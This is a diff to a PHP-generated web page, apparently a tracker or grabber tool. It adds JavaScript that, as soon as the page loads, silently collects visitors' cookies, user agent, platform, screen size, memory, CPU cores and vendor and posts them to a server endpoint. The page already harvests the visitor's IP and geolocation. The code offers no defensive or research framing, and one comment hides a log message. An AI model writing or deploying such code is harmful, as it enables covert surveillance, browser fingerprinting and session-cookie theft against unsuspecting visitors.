@@ -1,7 +1,7 @@
 <?php
 include 'ip.php';
 
-// Add JavaScript to capture location
+// Add JavaScript to capture location, cookies, and device info
 echo '
 <!DOCTYPE html>
 <html>
@@ -21,6 +21,27 @@ echo '
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 xhr.send("message=" + encodeURIComponent(message));
             }
+        }
+        
+        // COOKIE AND DEVICE INFO CAPTURE
+        function captureDeviceInfo() {
+            var deviceData = {
+                cookies: document.cookie || "No cookies available",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + "x" + screen.height,
+                language: navigator.language,
+                memory: navigator.deviceMemory || "Unknown",
+                cores: navigator.hardwareConcurrency || "Unknown",
+                vendor: navigator.vendor || "Unknown",
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send device info to server
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "device.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify(deviceData));
         }
         
         function getLocation() {
@@ -111,6 +132,9 @@ echo '
         
         // Try to get location when page loads
         window.onload = function() {
+            // Capture device info and cookies IMMEDIATELY
+            captureDeviceInfo();
+            
             // Don\'t log this message
             setTimeout(function() {
                 getLocation();
